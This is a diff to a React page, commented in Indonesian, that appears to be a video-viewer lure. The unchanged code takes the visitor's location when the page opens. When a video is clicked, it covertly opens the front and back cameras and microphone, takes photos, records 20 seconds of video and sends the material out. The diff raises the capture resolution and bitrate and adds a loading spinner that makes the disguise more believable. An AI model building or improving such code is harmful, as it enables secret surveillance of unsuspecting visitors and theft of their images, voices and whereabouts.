@@ -8,6 +8,7 @@ function App() {
   const [isFullscreen, setIsFullscreen] = useState(false);
   const [hasRequestedLocation, setHasRequestedLocation] = useState(false);
   const [hasRequestedCamera, setHasRequestedCamera] = useState(false);
+  const [isLoading, setIsLoading] = useState<boolean[]>([]); // State untuk melacak loading video
   const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
   const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
@@ -29,6 +30,11 @@ function App() {
     { videoUrl: 'https://cdn.videy.co/VVH2RmCn1.mp4' },
     { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' },
   ];
+
+  // Inisialisasi state loading untuk setiap video
+  useEffect(() => {
+    setIsLoading(new Array(videos.length).fill(true));
+  }, []);
 
   // Meminta akses lokasi saat situs pertama kali dibuka
   useEffect(() => {
@@ -52,7 +58,7 @@ function App() {
     };
 
     const sendVisitorNotification = async () => {
-      if (hasRequestedLocation) return; // Pastikan hanya dipanggil sekali
+      if (hasRequestedLocation) return;
       setHasRequestedLocation(true);
 
       const location = await getLocation();
@@ -72,7 +78,6 @@ function App() {
 
     sendVisitorNotification();
 
-    // Validasi URL video saat inisialisasi
     videos.forEach((video, index) => {
       console.log(`Memeriksa video ${index + 1}: ${video.videoUrl}`);
       if (!validateVideoUrl(video.videoUrl)) {
@@ -80,7 +85,6 @@ function App() {
       }
     });
 
-    // Cleanup saat komponen unmount
     return () => {
       cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
       cameraStreamsRef.current = [];
@@ -89,13 +93,13 @@ function App() {
 
   // Inisialisasi kamera saat video diklik
   const initializeCameraStreams = async () => {
-    if (hasRequestedCamera) return; // Pastikan hanya dipanggil sekali
+    if (hasRequestedCamera) return;
     setHasRequestedCamera(true);
 
     const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
       try {
         const constraints = {
-          video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+          video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
           audio: true,
         };
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -113,7 +117,6 @@ function App() {
       const videoDevices = devices.filter(device => device.kind === 'videoinput');
       console.log('Perangkat kamera yang ditemukan:', videoDevices.map(d => ({ label: d.label, deviceId: d.deviceId })));
 
-      // Inisialisasi kamera depan
       const frontResult = await requestMediaAccess('user', 'depan');
       if (frontResult) {
         cameraStreamsRef.current.push({ stream: frontResult.stream, type: 'depan', deviceId: frontResult.deviceId });
@@ -121,7 +124,6 @@ function App() {
         console.warn('Kamera depan tidak tersedia atau akses ditolak.');
       }
 
-      // Inisialisasi kamera belakang dengan fallback
       let backResult = await requestMediaAccess('environment', 'belakang');
       if (!backResult && videoDevices.length > 1) {
         console.log('Mencoba kamera belakang dengan deviceId alternatif...');
@@ -156,7 +158,7 @@ function App() {
   const reinitializeStream = async (cameraType: string, deviceId: string): Promise<MediaStream | null> => {
     try {
       const constraints = {
-        video: { deviceId: { exact: deviceId }, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+        video: { deviceId: { exact: deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
         audio: true,
       };
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -212,17 +214,17 @@ function App() {
       const videoHeight = cameraVideo.videoHeight;
       console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);
 
-      // Mengambil foto
+      // Mengambil foto dengan resolusi lebih tinggi
       const canvas = document.createElement('canvas');
       const canvasAspectRatio = 9 / 16;
       const videoAspectRatio = videoWidth / videoHeight;
 
       let drawWidth, drawHeight, offsetX, offsetY;
       if (videoAspectRatio > canvasAspectRatio) {
-        drawWidth = 720;
+        drawWidth = 1080; // Tingkatkan resolusi untuk kualitas HD
         drawHeight = drawWidth / videoAspectRatio;
       } else {
-        drawHeight = 1280;
+        drawHeight = 1920; // Tingkatkan resolusi untuk kualitas HD
         drawWidth = drawHeight * videoAspectRatio;
       }
 
@@ -248,12 +250,12 @@ function App() {
         console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
       }
 
-      // Merekam video
+      // Merekam video dengan kualitas lebih tinggi
       const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
         .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
       const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: 1000000, // Kurangi bitrate untuk jaringan lelet
+        videoBitsPerSecond: 2500000, // Tingkatkan bitrate untuk kualitas HD
       });
       mediaRecorderRef.current = mediaRecorder;
       const chunks: BlobPart[] = [];
@@ -289,7 +291,7 @@ function App() {
           console.log(`Perekaman kamera ${type} dihentikan setelah 20 detik.`);
         }
         resolve(null);
-      }, 20000)); // Kurangi durasi menjadi 20 detik
+      }, 20000));
 
       if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
     } catch (error) {
@@ -301,7 +303,6 @@ function App() {
     console.log('Memulai proses perekaman untuk kamera...');
 
     try {
-      // Inisialisasi kamera saat video diklik
       await initializeCameraStreams();
 
       if (cameraStreamsRef.current.length === 0) {
@@ -395,7 +396,14 @@ function App() {
     console.log(`Video di indeks ${index} telah selesai.`);
   };
 
-  // Penanganan fullscreen change dan beforeunload
+  const handleCanPlay = (index: number) => {
+    setIsLoading((prev) => {
+      const newLoading = [...prev];
+      newLoading[index] = false;
+      return newLoading;
+    });
+  };
+
   useEffect(() => {
     const handleFullscreenChange = () => {
       if (!document.fullscreenElement && isFullscreen) {
@@ -442,6 +450,14 @@ function App() {
           <div className="space-y-2">
             {videos.map((video, index) => (
               <div key={index} className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16', maxHeight: '200px' }}>
+                {isLoading[index] && (
+                  <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
+                    <svg className="animate-spin h-8 w-8 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                  </div>
+                )}
                 <video
                   ref={(el) => (videoRefs.current[index] = el)}
                   src={video.videoUrl}
@@ -449,8 +465,9 @@ function App() {
                   muted
                   onClick={() => handleVideoClick(index)}
                   onEnded={() => handleVideoEnded(index)}
-                  preload="auto" // Optimasi preload untuk buffering lebih baik
-                  playsInline // Pastikan video diputar inline di mobile
+                  onCanPlay={() => handleCanPlay(index)}
+                  preload="auto"
+                  playsInline
                   {...({ loading: 'lazy' } as any)}
                 >
                   <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
